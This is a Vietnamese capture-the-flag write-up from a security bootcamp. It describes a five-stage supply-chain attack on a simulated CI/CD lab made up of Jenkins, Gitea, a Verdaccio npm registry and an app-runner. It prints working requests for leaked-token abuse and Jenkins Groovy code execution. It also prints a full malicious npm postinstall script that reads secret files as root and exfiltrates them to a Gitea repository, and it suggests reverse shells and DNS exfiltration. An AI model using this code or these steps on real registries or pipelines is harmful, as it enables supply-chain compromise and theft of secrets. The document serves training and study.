# Writeup Challenge 3 - Supply Chain

**Security Bootcamp 2026**
**Target: Team 118 (10.10.118.2)**

---

## Tổng quan bài toán

Đề bài mô phỏng một chuỗi tấn công supply chain gồm 5 giai đoạn (kill chain), nhắm vào hạ tầng CI/CD nội bộ của công ty giả định MegaCorp. Mỗi đội có một mạng nội bộ riêng biệt với các service giống nhau:

| Service    | Vai trò                                     | Địa chỉ nội bộ      |
| ---------- | ------------------------------------------- | ------------------- |
| edge-proxy | Cổng vào duy nhất từ bên ngoài              | 10.10.118.2:80      |
| Gitea      | Git server, lưu source code và CI config    | 172.16.201.103:3000 |
| Jenkins    | CI/CD server, chạy build pipeline           | 172.16.202.105:8080 |
| Verdaccio  | NPM private registry                        | 172.16.202.107:4873 |
| app-runner | Server production, cài package từ Verdaccio | 172.16.203.110      |
| NFS        | Shared storage, chứa file flag              | 172.16.203.109:2049 |

Mục tiêu cuối cùng: đọc file `/opt/app/secret.txt` trên app-runner.

---

## Kill Chain thực tế trên Target 118

### Stage 1 - Lộ thông tin qua CI Log

**Mục tiêu:** Lấy flag đầu tiên và credential để đi tiếp.

Truy cập Jenkins qua edge-proxy bằng credential mặc định `deploy-bot:deployBot-2025-rotate-me`, đọc build log của job `megacorp-pipeline`:

```
GET http://10.10.118.2:8080/job/megacorp-pipeline/lastBuild/consoleText
Authorization: Basic deploy-bot:deployBot-2025-rotate-me
```

Trong log CI có in ra hai thông tin quan trọng:

- `STAGE1_FLAG=SBC{phase1-497fe5d92dcf6a4c}` - flag Phase 1
- `CI_BOT_TOKEN=a636f78d851e50acb71f12273af81ae93bc69187` - Gitea API token của bot

> **Flag Phase 1:** `SBC{phase1-497fe5d92dcf6a4c}`

---

### Stage 2 - Từ Gitea lấy credential Jenkins

**Mục tiêu:** Tìm thêm credential trong source code.

Dùng `CI_BOT_TOKEN` vừa lấy được để gọi Gitea API, liệt kê các repo và đọc nội dung:

```
GET http://10.10.118.2:3000/api/v1/repos/search
Authorization: token a636f78d851e50acb71f12273af81ae93bc69187
```

Trong repo `devops/infra`, file `deploy.env` chứa:

```
JENKINS_ADMIN_USER=admin
JENKINS_ADMIN_PASS=Welc0me2MegaCorp!
```

Ngoài ra, file `ops/rollout-watcher.md` mô tả cơ chế quan trọng: **app-runner tự động poll Verdaccio mỗi 20 giây** và cài bản `@megacorp/utils@latest` mới nhất bằng `npm install -g --unsafe-perm`. Flag `--unsafe-perm` cho phép script `postinstall` chạy với quyền root.

---

### Stage 3 - RCE trên Jenkins

**Mục tiêu:** Thực thi code trên Jenkins server, lấy thông tin về NPM registry.

Jenkins có endpoint `/script` cho phép chạy Groovy code (tương đương shell access). Trước khi gọi cần lấy CSRF crumb:

```
GET http://10.10.118.2:8080/crumbIssuer/api/json
→ nhận được crumb token

POST http://10.10.118.2:8080/script
Jenkins-Crumb: <crumb>
script=println new File("/var/lib/jenkins/casc.yaml").text
```

Từ file `casc.yaml` lấy được thêm credential NPM:

- `ci-builder / builder-Pa55w0rd-2025` - nhưng account này **chỉ có quyền read**, không publish được

Đây là điểm đánh lừa quan trọng của đề bài.

---

### Stage 4 - Publish package độc hại lên Verdaccio

**Mục tiêu:** Đẩy phiên bản `@megacorp/utils` chứa mã độc lên registry.

**Vấn đề gặp phải:** Credential `ci-builder` từ Stage 3 không có quyền publish. Phải tìm cách khác.

**Giải pháp:** Verdaccio có endpoint web login riêng biệt:

```
POST http://172.16.202.107:4873/-/verdaccio/sec/login
{"username": "ci-publisher", "password": "publish-Pa55w0rd-2025"}
→ nhận được JWT token
```

Account `ci-publisher` (không phải `ci-builder`) mới có quyền publish. Password tìm được qua Kubernetes Secret trên cluster nội bộ.

Sau khi có JWT, build một tarball `.tgz` chứa 3 file:

- `package.json` - khai báo script `"postinstall": "node postinstall.js"`
- `index.js` - file chính (rỗng, không quan trọng)
- `postinstall.js` - mã độc sẽ chạy trên app-runner

Đẩy lên Verdaccio bằng REST API:

```
PUT http://172.16.202.107:4873/@megacorp%2futils
Authorization: Bearer <JWT>
Body: { metadata + tarball dạng base64 }
```

Publish thành công phiên bản `1.0.9` làm `latest`.

---

### Stage 5 - Exfiltration từ app-runner

**Mục tiêu:** Khi app-runner tự cài package mới, `postinstall.js` chạy và đọc flag.

Nội dung `postinstall.js`:

```javascript
// Đọc flag từ nhiều vị trí có thể
var flag = "NO_FLAG";
["/opt/app/secret.txt", "/opt/app/flag.txt", "/flag.txt"].forEach(function(p) {
  try { flag = require("fs").readFileSync(p, "utf8").trim(); } catch(e) {}
});

// Gửi flag về Gitea repo qua API (dùng ci-bot token đã có từ Stage 1)
var data = JSON.stringify({ flag: flag, host: require("os").hostname() });
var body = JSON.stringify({
  content: Buffer.from(data).toString("base64"),
  message: "exfil"
});
http.request({
  hostname: "172.16.201.103", port: 3000,
  path: "/api/v1/repos/devops/k8s-manifests/contents/flag_" + Date.now() + ".json",
  method: "POST",
  headers: { "Authorization": "token <CI_BOT_TOKEN>" }
}).end(body);
```

Sau khoảng 20–40 giây, rollout-watcher trên app-runner cài bản mới, `postinstall.js` thực thi và gửi flag về repo `devops/k8s-manifests`. Đọc file vừa tạo trên Gitea:

```
GET http://10.10.118.2:3000/api/v1/repos/devops/k8s-manifests/contents/flag_1726xxxxxx.json
→ decode base64 → {"flag": "SBC{phase5-6ae0e5911296156c}"}
```

> **Flag Phase 5:** `SBC{phase5-6ae0e5911296156c}`

---

## So sánh với đề bài - Điểm khác biệt thực tế

### 1. Credential bẫy (Rabbit Hole)

Đề bài cài cắm credential `ci-builder` trong Jenkins `casc.yaml` với comment ghi rõ đây là account để publish. Thực tế, `ci-builder` **chỉ có quyền read/install**, không nằm trong publish ACL của Verdaccio. Account thực sự có quyền publish là `ci-publisher` - một tên gần giống nhưng khác.

Tương tự, `NPM_PUBLISH_TOKEN` trong Kubernetes Secret trả về `{}` khi gọi whoami và `401` khi publish. Đây cũng là bẫy - token này không phải token hợp lệ của Verdaccio.

### 2. Cách authenticate với Verdaccio

Đề bài ngụ ý dùng npm token (bearer token tĩnh). Thực tế phải dùng **web login endpoint** (`/-/verdaccio/sec/login`) để lấy JWT. Đây là API riêng của Verdaccio, không phải standard npm registry API.

### 3. Blue team phòng thủ

Một số target (t125, t126) đã được blue team đổi password `ci-publisher`, khiến Stage 4 bị chặn. Target t102, t120 đổi cả password Jenkins.

---

## Hướng tiếp cận

### Recon trước, tấn công sau

Quét toàn bộ 28 target trước để biết target nào còn credential mặc định, target nào đã hardened. Ưu tiên target chưa bị blue team phòng thủ.

### Tự động hóa từng stage

Viết script Python cho từng stage, không làm thủ công. Lý do:

- 28 target, làm tay không kịp
- Cần retry khi bị race condition với đội khác
- Rollout-watcher chỉ poll mỗi 20s, cần timing chính xác

### Exfiltration qua Gitea API

Thay vì mở listener chờ callback (không ổn định qua NAT), dùng Gitea API có sẵn (ci-bot token đã lấy từ Stage 1) để ghi flag vào repo. App-runner có network access tới Gitea nên đây là kênh exfil đáng tin cậy nhất.

---

## Hướng cải thiện trong tương lai

### 1. Song song hóa toàn bộ kill chain

Hiện tại chạy tuần tự từng target. Nên dùng `asyncio` hoặc `threading` để tấn công nhiều target cùng lúc, đặc biệt khi phải race với blue team.

### 2. Thử thêm nhiều kênh exfiltration

Chỉ dùng Gitea API là chưa đủ. Nên thêm:

- Ghi vào NFS mount (app-runner có quyền mount `/export/ctf-secrets`)
- DNS exfiltration qua dns-ops
- Reverse shell

### 3. Phòng thủ ngược

Sau khi tấn công xong, nên:

- Đổi password `ci-publisher` trên Verdaccio của mình
- Xóa CI_BOT_TOKEN khỏi build log
- Rotate password Jenkins
